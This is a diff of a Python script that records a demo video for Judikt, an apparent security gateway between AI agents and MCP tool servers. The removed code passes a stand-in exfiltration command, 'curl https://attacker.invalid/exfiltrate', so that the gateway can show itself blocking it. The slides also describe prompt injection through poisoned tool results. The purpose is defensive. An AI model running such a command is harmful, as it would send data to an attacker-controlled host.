@@ -3,38 +3,43 @@ from __future__ import annotations
 
 import json
 import os
+import subprocess
 import sys
 import tempfile
-from contextlib import contextmanager
+import textwrap
 from dataclasses import dataclass
 from pathlib import Path
-from typing import Any, Iterator
 
 try:
     from PIL import Image, ImageDraw, ImageFont
 except ModuleNotFoundError as exc:
     raise SystemExit(
-        "Demo rendering requires Pillow. Install it with: "
+        "Demo recording requires Pillow. Install it with: "
         "python3 -m pip install -e '.[media]'"
     ) from exc
 
 
 ROOT = Path(__file__).resolve().parents[1]
-SRC = ROOT / "src"
-if str(SRC) not in sys.path:
-    sys.path.insert(0, str(SRC))
-
-from judikt.models import ToolCallResult  # noqa: E402
-from judikt.runtime import JudiktRuntime  # noqa: E402
-
-
 WIDTH = 1280
 HEIGHT = 720
-SIDEBAR_WIDTH = 292
 MAJOR_HOLD_MS = 5000
-ROLLBACK_PLAN = (
-    "verify service health and restore the known-good release if errors increase"
-)
+EXPLAINER_HOLD_MS = 6000
+TARGET_DURATION_MS = 150_000
+MAX_COLUMNS = 112
+MAX_ROWS = 23
+LINE_HEIGHT = 25
+
+BACKGROUND = "#090D12"
+TITLEBAR = "#171C22"
+PANEL = "#0C1117"
+BORDER = "#30363D"
+TEXT = "#E6EDF3"
+MUTED = "#7D8590"
+GREEN = "#3FB950"
+BLUE = "#58A6FF"
+AMBER = "#D29922"
+RED = "#F85149"
+PURPLE = "#BC8CFF"
 
 COLORS = {
     "background": "#07111B",
@@ -53,26 +58,13 @@ COLORS = {
     "blue_dark": "#17344E",
     "purple": "#B89CFF",
     "purple_dark": "#30284A",
-    "white": "#FFFFFF",
 }
 
 
 @dataclass(frozen=True)
-class Scene:
-    number: int
-    nav_title: str
-    eyebrow: str
+class TerminalPage:
     title: str
-    subtitle: str
-    intent: str
-    tool: str
-    checks: tuple[str, ...]
-    decision: str
-    rule: str
-    risk: str
-    result_lines: tuple[str, ...]
-    evidence: str
-    accent: str
+    lines: tuple[str, ...]
 
 
 @dataclass(frozen=True)
@@ -94,218 +86,107 @@ class InfoSlide:
 INFO_SLIDES = (
     InfoSlide(
         eyebrow="WHAT JUDIKT IS",
-        title="A deterministic control plane for AI tool use",
+        title="A deterministic control plane for MCP tools",
         subtitle=(
-            "Judikt sits between an AI agent and MCP servers, governing both the "
-            "request and the untrusted result."
+            "Judikt sits between an AI agent and operational MCP servers, "
+            "governing both the request and the untrusted response."
         ),
         cards=(
-            InfoCard(
-                "INTERCEPT",
-                "Receives every MCP tool request before the upstream server sees it.",
-                "blue",
-            ),
-            InfoCard(
-                "DECIDE",
-                "Applies identity, policy, risk, approval, rate, and kill-switch controls.",
-                "amber",
-            ),
-            InfoCard(
-                "INSPECT",
-                "Scans tool definitions and returned content before either is trusted.",
-                "red",
-            ),
-            InfoCard(
-                "PROVE",
-                "Produces correlated metrics, traces, findings, and signed audit evidence.",
-                "green",
-            ),
+            InfoCard("INTERCEPT", "Receive every tool request before an upstream server sees it.", "blue"),
+            InfoCard("DECIDE", "Apply identity, policy, risk, approval, rate, and kill-switch controls.", "amber"),
+            InfoCard("INSPECT", "Scan tool definitions and returned content before either is trusted.", "red"),
+            InfoCard("PROVE", "Emit correlated metrics, traces, findings, and signed audit evidence.", "green"),
         ),
-        takeaway=(
-            "The model proposes. Judikt decides. The MCP tool executes only after "
-            "deterministic controls resolve."
-        ),
+        takeaway="The model proposes an action. Deterministic controls decide whether it can execute.",
     ),
     InfoSlide(
         eyebrow="THE PRODUCTION PROBLEM",
         title="Agent speed creates a new control gap",
         subtitle=(
-            "An agent can turn an ambiguous instruction or malicious tool result into a "
-            "high-impact action faster than a human can intervene."
+            "Ambiguous intent, excessive privilege, and poisoned tool content can become "
+            "production impact faster than a human can intervene."
         ),
         cards=(
-            InfoCard(
-                "OVERREACH",
-                "A broad prompt can target production or invoke a more powerful tool than intended.",
-                "red",
-            ),
-            InfoCard(
-                "CONFUSED DEPUTY",
-                "Passing caller tokens upstream can lend an agent privileges it should not inherit.",
-                "amber",
-            ),
-            InfoCard(
-                "POISONED RESULTS",
-                "An MCP response can contain indirect instructions designed to manipulate the agent.",
-                "purple",
-            ),
-            InfoCard(
-                "WEAK EVIDENCE",
-                "Plain logs may leak secrets and cannot prove that historical records were unchanged.",
-                "blue",
-            ),
+            InfoCard("OVERREACH", "A broad prompt can invoke a tool or environment the user never intended.", "red"),
+            InfoCard("CONFUSED DEPUTY", "Forwarded caller tokens can lend an agent privileges it should not inherit.", "amber"),
+            InfoCard("POISONED RESULT", "A tool response can contain instructions intended to manipulate the agent.", "purple"),
+            InfoCard("WEAK EVIDENCE", "Plain logs can leak secrets and cannot prove records were not changed.", "blue"),
         ),
-        takeaway=(
-            "Judikt adds controls for agent intent, tool execution, and untrusted tool "
-            "content without asking an LLM to police itself."
-        ),
+        takeaway="AI infrastructure needs the same bounded execution and evidence standards as production operations.",
     ),
     InfoSlide(
-        eyebrow="HOW IT WORKS",
-        title="One guarded path in both directions",
+        eyebrow="REQUEST GOVERNANCE",
+        title="Control the action before execution",
         subtitle=(
-            "The outbound request and inbound response pass through separate controls, "
-            "while evidence is emitted for every outcome."
+            "A deterministic request gate reduces blast radius without asking another model "
+            "to judge whether the first model is safe."
         ),
         cards=(
-            InfoCard(
-                "01  REQUEST",
-                "Agent sends a tool name, arguments, authenticated identity, and correlation context.",
-                "blue",
-            ),
-            InfoCard(
-                "02  REQUEST GATE",
-                "AuthZ, policy, risk, rate limit, approval, rollback plan, and kill switch resolve.",
-                "amber",
-            ),
-            InfoCard(
-                "03  MCP EXECUTION",
-                "Pinned tool metadata is verified before a permitted call crosses the MCP boundary.",
-                "purple",
-            ),
-            InfoCard(
-                "04  RESPONSE GATE",
-                "Injection scan and redaction run before the result returns; evidence fans out.",
-                "green",
-            ),
+            InfoCard("IDENTITY", "JWT/OIDC validation and actor binding stop identity spoofing.", "blue"),
+            InfoCard("POLICY + RISK", "Allowlists, argument rules, and risk scores resolve predictable verdicts.", "amber"),
+            InfoCard("HUMAN CONTROL", "Signed approvals and rollback plans bind high-risk changes to reviewed intent.", "purple"),
+            InfoCard("BLAST RADIUS", "Rate limits, circuit breakers, dry-run, and kill switches bound failure.", "red"),
         ),
-        takeaway=(
-            "Denied requests never reach the tool. Allowed results never reach the agent "
-            "before response inspection."
-        ),
+        takeaway="Denied requests never cross the MCP boundary; evaluation-only requests never mutate a backend.",
     ),
     InfoSlide(
-        eyebrow="FEATURES AND VALUE",
-        title="SRE controls adapted to agentic infrastructure",
+        eyebrow="RESPONSE DEFENSE",
+        title="Treat tool output as untrusted input",
         subtitle=(
-            "Each capability closes a concrete failure mode instead of adding an AI-shaped "
-            "wrapper around an unrestricted tool call."
+            "The return path is a separate security boundary because tool content can leak "
+            "credentials or influence the next agent decision."
         ),
         cards=(
-            InfoCard(
-                "REQUEST GOVERNANCE",
-                "Allowlisting, JWT identity, actor binding, and rate limits reduce unauthorized access and blast radius.",
-                "blue",
-            ),
-            InfoCard(
-                "CONTROLLED CHANGE",
-                "Signed approvals, rollback plans, dry-run, and kill switches keep humans in high-risk operations.",
-                "amber",
-            ),
-            InfoCard(
-                "RESPONSE DEFENSE",
-                "Definition pinning, injection scanning, and redaction limit rug pulls, manipulation, and leakage.",
-                "red",
-            ),
-            InfoCard(
-                "OPERABILITY",
-                "Signed audit chains, metrics, traces, and durable findings support incident response and review.",
-                "green",
-            ),
+            InfoCard("PIN", "Hash tool descriptions and schemas to detect reconnect-time rug pulls.", "blue"),
+            InfoCard("SCAN", "Detect direct and indirect prompt-injection patterns deterministically.", "red"),
+            InfoCard("QUARANTINE", "Withhold unsafe text and expose only bounded finding metadata and hashes.", "amber"),
+            InfoCard("REDACT", "Recursively remove sensitive keys and values before agent and audit exposure.", "green"),
         ),
-        takeaway=(
-            "The result is safer automation with explicit decisions, bounded execution, and "
-            "evidence an SRE can investigate."
-        ),
+        takeaway="An allowed tool call is not automatically a trusted tool response.",
     ),
     InfoSlide(
-        eyebrow="BACKEND IMPLEMENTATIONS",
-        title="What actually runs behind each MCP server",
+        eyebrow="TRUST BOUNDARIES",
+        title="Production safety is explicit, not implied",
         subtitle=(
-            "Judikt launches built-in adapters as isolated stdio child processes and can "
-            "broker independently built MCP server commands."
+            "Judikt separates caller identity, gateway authority, upstream credentials, "
+            "tool processes, and evidence systems into independently controlled boundaries."
         ),
         cards=(
-            InfoCard(
-                "PLATFORM-OPS",
-                "PlatformOpsBackend mutates deterministic in-memory service health and release state for the safe demo.",
-                "blue",
-            ),
-            InfoCard(
-                "KUBERNETES",
-                "KubernetesBackend is simulated by default and uses real kubectl when explicitly configured.",
-                "purple",
-            ),
-            InfoCard(
-                "INCIDENT",
-                "IncidentBackend maintains an in-process incident timeline and correlated evidence records.",
-                "amber",
-            ),
-            InfoCard(
-                "EXTERNAL MCP",
-                "Configured commands run as independent processes with minimal, explicitly brokered environments.",
-                "green",
-            ),
+            InfoCard("CALLER", "Authenticate the subject and reject caller-controlled credential passthrough.", "blue"),
+            InfoCard("GATEWAY", "Broker scoped secrets and execute only policy-approved operations.", "green"),
+            InfoCard("MCP SERVER", "Run external servers with minimal explicitly brokered environments.", "purple"),
+            InfoCard("EVIDENCE", "Keep audit signing independent from approval signing and application output.", "amber"),
         ),
-        takeaway=(
-            "The local tools are safe simulators; the gateway, MCP transport, policy decisions, "
-            "response controls, and evidence path are the real code under demonstration."
-        ),
+        takeaway="Compromise in one boundary should not silently grant authority across the whole agent workflow.",
     ),
     InfoSlide(
-        eyebrow="WORKING DEMONSTRATION",
-        title="The next decisions come from the real runtime",
+        eyebrow="PRODUCTION OPERABILITY",
+        title="Security controls must remain operable",
         subtitle=(
-            "The renderer starts Judikt, local MCP subprocesses, and a controlled malicious "
-            "fixture, then records returned ToolCallResult objects."
+            "A production control plane needs measurable reliability, deployable infrastructure, "
+            "and evidence that survives an incident."
         ),
         cards=(
-            InfoCard(
-                "8 GUARDED CALLS",
-                "Allow, deny, approval, dry-run, quarantine, and kill-switch paths execute end to end.",
-                "green",
-            ),
-            InfoCard(
-                "REAL MCP BOUNDARY",
-                "Built-in tools and an independently running JSON-RPC MCP fixture use subprocess I/O.",
-                "blue",
-            ),
-            InfoCard(
-                "CONTROLLED ATTACK",
-                "The external fixture returns indirect prompt injection to prove inbound quarantine behavior.",
-                "red",
-            ),
-            InfoCard(
-                "VERIFIABLE STATE",
-                "Temporary signed audit events and metrics are checked before the media file is written.",
-                "purple",
-            ),
+            InfoCard("OBSERVE", "Prometheus, OpenTelemetry, OpenInference, X-Ray, and dashboards expose behavior.", "blue"),
+            InfoCard("PERSIST", "Hash-chained SQLite or signed DynamoDB events preserve decision evidence.", "green"),
+            InfoCard("DEPLOY", "Docker, Helm, Terraform, API Gateway, Lambda, and CloudWatch support rollout.", "purple"),
+            InfoCard("QUALIFY", "Adversarial tests, failure drills, interop, benchmarks, SLOs, and runbooks reduce guesswork.", "amber"),
         ),
-        takeaway=(
-            "No cloud, LLM, or production endpoint is contacted; the security decisions are "
-            "real while the demonstration remains safe to reproduce."
-        ),
+        takeaway="The quality signal is not feature count; it is deterministic behavior under normal and failure paths.",
     ),
 )
 
 
-def collect_scenes() -> tuple[list[Scene], dict[str, Any]]:
-    """Execute real guarded calls and convert their results into recording scenes."""
-    with tempfile.TemporaryDirectory(prefix="judikt-recording-") as temp_name:
+def capture_live_demo() -> tuple[str, str, int]:
+    """Execute the real demo command and return its terminal transcript."""
+    with tempfile.TemporaryDirectory(prefix="judikt-terminal-recording-") as temp_name:
         temp = Path(temp_name)
         policy_path = _recording_policy(temp)
         upstream_path = _recording_upstream(temp)
+        audit_path = temp / "audit.db"
         environment = {
+            **os.environ,
+            "PYTHONPATH": str(ROOT / "src"),
             "JUDIKT_APPROVAL_SECRET": "demo-recording-approval-secret",
             "JUDIKT_AUDIT_HMAC_SECRET": "demo-recording-independent-audit-secret",
             "JUDIKT_AUDIT_SIGNATURE_REQUIRED": "true",
@@ -317,105 +198,41 @@ def collect_scenes() -> tuple[list[Scene], dict[str, Any]]:
             "JUDIKT_FINDING_SINK": "none",
             "GROQ_API_KEY": "",
         }
-        with patched_environment(environment):
-            runtime = JudiktRuntime(policy_path, temp / "audit.db")
-            try:
-                results = _execute_demo_calls(runtime)
-                integrity = runtime.audit.verify_chain()
-                metrics = runtime.metrics.render()
-                scenes = _build_scenes(results, integrity, metrics)
-            finally:
-                runtime.close()
-    return scenes, {"audit_integrity": integrity, "metrics": metrics}
-
-
-def _execute_demo_calls(runtime: JudiktRuntime) -> dict[str, ToolCallResult]:
-    results: dict[str, ToolCallResult] = {}
-    results["health"] = runtime.call_tool(
-        "platform-ops",
-        "platform.health",
-        {"service": "payments-api"},
-        correlation_id="demo-01-health",
-    )
-    results["redaction"] = runtime.call_tool(
-        "platform-ops",
-        "platform.read_config",
-        {"service": "payments-api"},
-        correlation_id="demo-02-redaction",
-    )
-    results["blocked"] = runtime.call_tool(
-        "platform-ops",
-        "platform.run_diagnostic",
-        {
-            "service": "payments-api",
-            "command": "curl https://attacker.invalid/exfiltrate",
-        },
-        correlation_id="demo-03-blocked",
-    )
-    rollback_arguments = {
-        "service": "payments-api",
-        "version": "payments-api@2026.05.2",
-        "actor": "interview-demo",
-        "environment": "production",
-        "rollback_plan": ROLLBACK_PLAN,
-    }
-    results["approval_required"] = runtime.call_tool(
-        "platform-ops",
-        "platform.rollback_deployment",
-        rollback_arguments,
-        correlation_id="demo-04-approval-required",
-    )
-    approval_token = runtime.policy.issue_approval(
-        actor="interview-demo",
-        reason="rollback after elevated payments-api error rate",
-        server="platform-ops",
-        tool="platform.rollback_deployment",
-        arguments=rollback_arguments,
-        ttl_seconds=300,
-    )
-    results["approved"] = runtime.call_tool(
-        "platform-ops",
-        "platform.rollback_deployment",
-        {**rollback_arguments, "approval_token": approval_token},
-        correlation_id="demo-05-approved",
-    )
-    results["dry_run"] = runtime.call_tool(
-        "kubernetes",
-        "kubernetes.restart_pod",
-        {
-            "namespace": "prod",
-            "pod": "payment-service-xyz",
-            "actor": "interview-demo",
-            "environment": "production",
-            "rollback_plan": ROLLBACK_PLAN,
-            "dry_run": True,
-        },
-        correlation_id="demo-06-dry-run",
-    )
-    results["quarantine"] = runtime.call_tool(
-        "external-incidents",
-        "external.fetch_issue",
-        {"issue_id": "INC-2048"},
-        correlation_id="demo-07-quarantine",
-    )
-    runtime.policy.set_tool_enabled("platform.health", False)
-    try:
-        results["kill_switch"] = runtime.call_tool(
-            "platform-ops",
-            "platform.health",
-            {"service": "payments-api"},
-            correlation_id="demo-08-kill-switch",
+        command = [
+            str(ROOT / "scripts" / "run_demo.sh"),
+            "--policy",
+            str(policy_path),
+            "--audit-db",
+            str(audit_path),
+        ]
+        completed = subprocess.run(
+            command,
+            cwd=ROOT,
+            env=environment,
+            capture_output=True,
+            text=True,
+            timeout=90,
+            check=False,
         )
-    finally:
-        runtime.policy.set_tool_enabled("platform.health", True)
-    return results
+        if completed.returncode != 0:
+            raise SystemExit(
+                "live demo command failed\n"
+                f"stdout:\n{completed.stdout}\n"
+                f"stderr:\n{completed.stderr}"
+            )
+        display_command = (
+            "./scripts/run_demo.sh --policy $TMP/policy.json "
+            "--audit-db $TMP/audit.db"
+        )
+        _verify_transcript(completed.stdout)
+        return display_command, completed.stdout, completed.returncode
 
 
 def _recording_policy(temp: Path) -> Path:
     policy = json.loads((ROOT / "config" / "policies.yaml").read_text())
     policy["allowed_tools"]["external-incidents"] = ["external.fetch_issue"]
     policy["actor_permissions"]["anonymous"].append("external.fetch_issue")
-    destination = temp / "recording-policy.json"
+    destination = temp / "policy.json"
     destination.write_text(json.dumps(policy, indent=2) + "\n")
     return destination
 
@@ -430,358 +247,184 @@ def _recording_upstream(temp: Path) -> Path:
             }
         }
     }
-    destination = temp / "recording-upstreams.json"
+    destination = temp / "upstreams.json"
     destination.write_text(json.dumps(config, indent=2) + "\n")
     return destination
 
 
-@contextmanager
-def patched_environment(values: dict[str, str]) -> Iterator[None]:
-    previous = {key: os.environ.get(key) for key in values}
-    try:
-        os.environ.update(values)
-        yield
-    finally:
-        for key, value in previous.items():
-            if value is None:
-                os.environ.pop(key, None)
-            else:
-                os.environ[key] = value
-
-
-def _build_scenes(
-    results: dict[str, ToolCallResult], integrity: dict[str, Any], metrics: str
-) -> list[Scene]:
-    health = _dict_result(results["health"])
-    config = _dict_result(results["redaction"])
-    approved = _dict_result(results["approved"])
-    dry_run = _dict_result(results["dry_run"])
-    quarantine = _dict_result(results["quarantine"])
-    findings = quarantine.get("inspection", {}).get("findings", [])
-    finding_count = len({str(item.get("rule")) for item in findings})
-    blocked_calls = sum(
-        int(line.rsplit(" ", 1)[-1])
-        for line in metrics.splitlines()
-        if 'outcome="blocked"' in line
+def _verify_transcript(transcript: str) -> None:
+    required = (
+        "EXECUTED in MCP child process",
+        'result.api_key="[REDACTED]"',
+        "REQUIRE_APPROVAL",
+        "DRY_RUN_ONLY",
+        "QUARANTINE",
+        "kill_switch",
+        "valid=true",
+        "checked_events=8",
+        "PASS: every demonstrated branch",
     )
-    allowed_calls = sum(
-        int(line.rsplit(" ", 1)[-1])
-        for line in metrics.splitlines()
-        if 'outcome="allowed"' in line
-    )
+    missing = [value for value in required if value not in transcript]
+    if missing:
+        raise SystemExit(f"live demo transcript is missing required evidence: {missing}")
 
-    return [
-        _scene(
-            1,
-            "Health allowed",
-            "SAFE READ",
-            "Inspect production health",
-            "Low-risk observation passes deterministic policy checks.",
-            "Check the current payments-api service health",
-            results["health"],
-            ("tool allowlisted", "anonymous read authorized", "rate limit available"),
-            (
-                f"status              {health.get('status', 'unknown')}",
-                f"release             {health.get('release', 'unknown')}",
-                f"error rate (5m)     {health.get('error_rate_5m', 0):.3f}",
-                f"p99 latency         {health.get('p99_latency_ms', 0)} ms",
-            ),
-            "The result is scanned and redacted before it returns to the agent.",
-            "green",
-        ),
-        _scene(
-            2,
-            "Secret redacted",
-            "DATA LOSS PREVENTION",
-            "Return useful config, remove secrets",
-            "Recursive key and value rules sanitize both responses and audit evidence.",
-            "Read the payments-api production configuration",
-            results["redaction"],
-            ("read operation allowed", "response scanned", "secret key matched"),
-            (
-                f"environment         {config.get('environment', 'unknown')}",
-                f"region              {config.get('region', 'unknown')}",
-                f"database pool       {config.get('database_pool_size', 'unknown')}",
-                f"api_key             {config.get('api_key', '[REDACTED]')}",
-            ),
-            "The original credential never appears in the agent-visible result.",
-            "blue",
-            decision="REDACT + ALLOW",
-        ),
-        _scene(
-            3,
-            "Unsafe call denied",
-            "OUTBOUND GOVERNANCE",
-            "Block an exfiltration-shaped command",
-            "Arguments are inspected before the upstream MCP tool can execute.",
-            "Run curl against an untrusted endpoint",
-            results["blocked"],
-            ("tool allowlisted", "argument scanned", "blocked pattern matched"),
-            (
-                "upstream executed    false",
-                "matched control      blocked_argument_patterns",
-                "dangerous token      curl",
-                "finding exported     durable outbox ready",
-            ),
-            "The request is denied before crossing the MCP process boundary.",
-            "red",
-        ),
-        _scene(
-            4,
-            "Approval required",
-            "HUMAN CONTROL",
-            "Pause a production rollback",
-            "High-risk actions require an actor, rollback plan, and bound approval.",
-            "Rollback payments-api in production",
-            results["approval_required"],
-            ("actor authorized", "rollback plan present", "approval token missing"),
-            (
-                "upstream executed    false",
-                "required control     signed human approval",
-                "token binding        server + tool + arguments",
-                "default TTL          5 minutes",
-            ),
-            "Judikt returns a machine-readable REQUIRE_APPROVAL decision.",
-            "amber",
-        ),
-        _scene(
-            5,
-            "Approved rollback",
-            "CONTROLLED REMEDIATION",
-            "Execute the exact approved rollback",
-            "An HMAC token authorizes only the reviewed action and arguments.",
-            "Retry the rollback with a signed approval token",
-            results["approved"],
-            ("signature valid", "arguments hash matches", "rollback plan enforced"),
-            (
-                f"action              {approved.get('action', 'deployment_rollback')}",
-                f"from release        {approved.get('from_release', 'unknown')}",
-                f"to release          {approved.get('to_release', 'unknown')}",
-                f"status              {approved.get('status', 'unknown')}",
-            ),
-            "Changing the tool or arguments invalidates the approval token.",
-            "green",
-        ),
-        _scene(
-            6,
-            "Dry run",
-            "SAFE EVALUATION",
-            "Evaluate Kubernetes remediation safely",
-            "Policy, identity, and risk run normally while execution is skipped.",
-            "Restart a production pod with dry_run=true",
-            results["dry_run"],
-            ("actor authorized", "production risk scored", "dry-run mode selected"),
-            (
-                f"mode                {dry_run.get('mode', 'dry_run')}",
-                f"executed            {str(dry_run.get('executed', False)).lower()}",
-                "policy evaluated    true",
-                "cluster mutation    none",
-            ),
-            "This is an explicit policy outcome, not a client-side convention.",
-            "purple",
-        ),
-        _scene(
-            7,
-            "Response quarantined",
-            "INBOUND MCP DEFENSE",
-            "Quarantine a poisoned tool response",
-            "A separately running MCP fixture returns indirect prompt injection.",
-            "Fetch issue INC-2048 from an external MCP server",
-            results["quarantine"],
-            ("tool definition pinned", "response scanned", "injection rule matched"),
-            (
-                f"quarantined         {str(quarantine.get('quarantined', False)).lower()}",
-                f"findings            {finding_count} high-severity rules",
-                f"scanned strings     {quarantine.get('inspection', {}).get('scanned_strings', 0)}",
-                "agent exposure      none",
-            ),
-            "Only finding metadata and one-way evidence hashes leave quarantine.",
-            "red",
-            decision="QUARANTINE",
-        ),
-        _scene(
-            8,
-            "Kill switch",
-            "OPERATOR OVERRIDE",
-            "Stop a tool immediately",
-            "Operators can disable a tool or an entire MCP server without redeploying.",
-            "Call platform.health while its kill switch is active",
-            results["kill_switch"],
-            ("kill switch checked first", "tool disabled", "upstream bypassed"),
-            (
-                "upstream executed    false",
-                "scope               platform.health",
-                "activation          immediate",
-                "re-enable           operator controlled",
-            ),
-            "The deny decision is still traced, metered, and audit-sealed.",
-            "red",
-        ),
-        Scene(
-            number=9,
-            nav_title="Evidence verified",
-            eyebrow="OPERATIONAL EVIDENCE",
-            title="Prove every decision after the fact",
-            subtitle="Metrics summarize behavior; a signed hash chain detects audit tampering.",
-            intent="Verify the complete recording run",
-            tool="audit.verify_chain + metrics.render",
-            checks=(
-                "all events hash-chained",
-                "HMAC signatures verified",
-                "metrics aggregated",
-            ),
-            decision="VERIFIED",
-            rule="tamper-evident",
-            risk="evidence",
-            result_lines=(
-                f"audit chain valid   {str(integrity['valid']).lower()}",
-                f"signed events       {integrity['checked_events']}",
-                f"allowed decisions   {allowed_calls}",
-                f"blocked decisions   {blocked_calls}",
-            ),
-            evidence=f"head hash  {str(integrity['head_hash'])[:24]}...",
-            accent="green",
-        ),
+
+def transcript_pages(command: str, transcript: str) -> list[TerminalPage]:
+    lines = transcript.rstrip().splitlines()
+    intro: list[str] = []
+    sections: list[tuple[str, list[str]]] = []
+    current_title = ""
+    current_lines: list[str] = []
+    for line in lines:
+        if line.startswith("## "):
+            if current_title:
+                sections.append((current_title, current_lines))
+            current_title = line[3:]
+            current_lines = [line]
+        elif current_title:
+            current_lines.append(line)
+        else:
+            intro.append(line)
+    if current_title:
+        sections.append((current_title, current_lines))
+
+    launch = [
+        f"gaurav@macbook-air Judikt % {command}",
+        "",
+        *intro,
+        "",
+        "[process] launching Judikt and isolated stdio MCP child servers...",
+        "[process] command is live; the following pages are captured stdout.",
     ]
-
-
-def _scene(
-    number: int,
-    nav_title: str,
-    eyebrow: str,
-    title: str,
-    subtitle: str,
-    intent: str,
-    result: ToolCallResult,
-    checks: tuple[str, ...],
-    result_lines: tuple[str, ...],
-    evidence: str,
-    accent: str,
-    *,
-    decision: str | None = None,
-) -> Scene:
-    return Scene(
-        number=number,
-        nav_title=nav_title,
-        eyebrow=eyebrow,
-        title=title,
-        subtitle=subtitle,
-        intent=intent,
-        tool=f"{result.server} / {result.tool}",
-        checks=checks,
-        decision=decision or result.action,
-        rule=result.rule,
-        risk=f"{result.risk_level} / {result.risk_score}",
-        result_lines=result_lines,
-        evidence=f"correlation  {result.correlation_id}",
-        accent=accent,
+    pages = [TerminalPage("LIVE COMMAND", tuple(_wrap_lines(launch)))]
+    for title, section_lines in sections:
+        wrapped = _wrap_lines(section_lines)
+        chunks = [wrapped[index : index + MAX_ROWS] for index in range(0, len(wrapped), MAX_ROWS)]
+        for index, chunk in enumerate(chunks, start=1):
+            suffix = f" ({index}/{len(chunks)})" if len(chunks) > 1 else ""
+            pages.append(TerminalPage(f"{title}{suffix}", tuple(chunk)))
+    pages.append(
+        TerminalPage(
+            "PROCESS EXIT",
+            (
+                "[process] Judikt closed all MCP subprocesses cleanly.",
+                "[process] temporary policy, pins, SQLite audit, and fixture removed.",
+                "[process] exit status: 0",
+                "",
+                "gaurav@macbook-air Judikt %",
+            ),
+        )
     )
+    return pages
 
 
-def _dict_result(result: ToolCallResult) -> dict[str, Any]:
-    return result.result if isinstance(result.result, dict) else {}
+def _wrap_lines(lines: list[str]) -> list[str]:
+    wrapped: list[str] = []
+    for line in lines:
+        if not line:
+            wrapped.append("")
+            continue
+        if len(line) <= MAX_COLUMNS:
+            wrapped.append(line)
+            continue
+        leading = len(line) - len(line.lstrip(" "))
+        indent = " " * leading
+        parts = textwrap.wrap(
+            line.strip(),
+            width=max(20, MAX_COLUMNS - leading),
+            initial_indent=indent,
+            subsequent_indent=f"{indent}  ",
+            break_long_words=True,
+            break_on_hyphens=False,
+        )
+        wrapped.extend(parts)
+    return wrapped
 
 
-def render_recording(scenes: list[Scene], output: Path, poster: Path) -> int:
-    fonts = load_fonts()
+def render_recording(
+    command: str,
+    pages: list[TerminalPage],
+    output: Path,
+    poster: Path,
+) -> int:
+    fonts = _load_fonts()
     frames: list[Image.Image] = []
     durations: list[int] = []
 
-    frames.append(render_intro(fonts))
-    durations.append(MAJOR_HOLD_MS)
-    for index, slide in enumerate(INFO_SLIDES):
-        frames.append(render_info_slide(slide, index, len(INFO_SLIDES), fonts))
-        durations.append(MAJOR_HOLD_MS)
-    frames.append(render_runtime_flow(fonts))
-    durations.append(MAJOR_HOLD_MS)
-    frames.append(render_verdict_branches(fonts))
-    durations.append(MAJOR_HOLD_MS)
-    for scene in scenes:
-        frames.append(render_scene(scene, scenes, fonts, phase=0))
-        durations.append(900)
-        frames.append(render_scene(scene, scenes, fonts, phase=1))
-        durations.append(1100)
-        frames.append(render_scene(scene, scenes, fonts, phase=2))
-        durations.append(MAJOR_HOLD_MS)
-    summary = render_outro(scenes, fonts)
-    frames.append(summary)
+    frames.append(_explainer_intro(fonts))
+    durations.append(EXPLAINER_HOLD_MS)
+    for index, slide in enumerate(INFO_SLIDES, start=1):
+        frames.append(_info_slide(slide, index, len(INFO_SLIDES), fonts))
+        durations.append(EXPLAINER_HOLD_MS)
+    frames.append(_architecture_slide(fonts))
+    durations.append(7000)
+    frames.append(_terminal_transition(fonts))
     durations.append(MAJOR_HOLD_MS)
 
-    output.parent.mkdir(parents=True, exist_ok=True)
-    poster.parent.mkdir(parents=True, exist_ok=True)
-    summary.save(poster, format="PNG", optimize=True)
-    paletted = [
-        frame.quantize(
-            colors=128, method=Image.Quantize.MEDIANCUT, dither=Image.Dither.NONE
+    prompt = "gaurav@macbook-air Judikt % "
+    for length in _typing_steps(len(command)):
+        typed = f"{prompt}{command[:length]}"
+        frames.append(_terminal_frame("LIVE COMMAND", [typed], fonts, 1, len(pages)))
+        durations.append(260)
+
+    for page_number, page in enumerate(pages, start=1):
+        reveal_sizes = _reveal_steps(len(page.lines))
+        for visible in reveal_sizes:
+            frames.append(
+                _terminal_frame(
+                    page.title,
+                    list(page.lines[:visible]),
+                    fonts,
+                    page_number,
+                    len(pages),
+                )
+            )
+            durations.append(420 if visible < len(page.lines) else MAJOR_HOLD_MS)
+
+    remaining_ms = TARGET_DURATION_MS - sum(durations)
+    if remaining_ms < MAJOR_HOLD_MS:
+        raise RuntimeError(
+            f"hybrid demo exceeds its 150-second budget before the outro: {sum(durations)} ms"
         )
-        for frame in frames
-    ]
-    paletted[0].save(
+    frames.append(_explainer_outro(fonts))
+    durations.append(remaining_ms)
+
+    poster.parent.mkdir(parents=True, exist_ok=True)
+    poster_frame = _explainer_intro(fonts)
+    poster_frame.save(poster, format="PNG", optimize=True)
+    output.parent.mkdir(parents=True, exist_ok=True)
+    palette_frames = [_palette(frame) for frame in frames]
+    palette_frames[0].save(
         output,
-        format="GIF",
         save_all=True,
-        append_images=paletted[1:],
+        append_images=palette_frames[1:],
         duration=durations,
         loop=0,
         optimize=True,
         disposal=2,
     )
-    return sum(durations)
+    duration_ms = sum(durations)
+    if duration_ms != TARGET_DURATION_MS:
+        raise RuntimeError(f"expected a 150-second recording, got {duration_ms} ms")
+    return duration_ms
 
 
-def load_fonts() -> dict[str, ImageFont.FreeTypeFont]:
-    sans = _font_path(
-        "/System/Library/Fonts/HelveticaNeue.ttc",
-        "/System/Library/Fonts/Helvetica.ttc",
-        "/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf",
-    )
-    mono = _font_path(
-        "/System/Library/Fonts/SFNSMono.ttf",
-        "/System/Library/Fonts/Menlo.ttc",
-        "/usr/share/fonts/truetype/dejavu/DejaVuSansMono.ttf",
-    )
-    return {
-        "brand": ImageFont.truetype(sans, 30),
-        "title": ImageFont.truetype(sans, 38),
-        "subtitle": ImageFont.truetype(sans, 19),
-        "body": ImageFont.truetype(sans, 17),
-        "small": ImageFont.truetype(sans, 14),
-        "tiny": ImageFont.truetype(sans, 12),
-        "mono": ImageFont.truetype(mono, 15),
-        "mono_small": ImageFont.truetype(mono, 13),
-        "hero": ImageFont.truetype(sans, 56),
-        "hero_small": ImageFont.truetype(sans, 46),
-        "metric": ImageFont.truetype(sans, 30),
-    }
-
-
-def _font_path(*candidates: str) -> str:
-    for candidate in candidates:
-        if Path(candidate).exists():
-            return candidate
-    raise RuntimeError("No supported TrueType font was found")
-
-
-def base_canvas() -> tuple[Image.Image, ImageDraw.ImageDraw]:
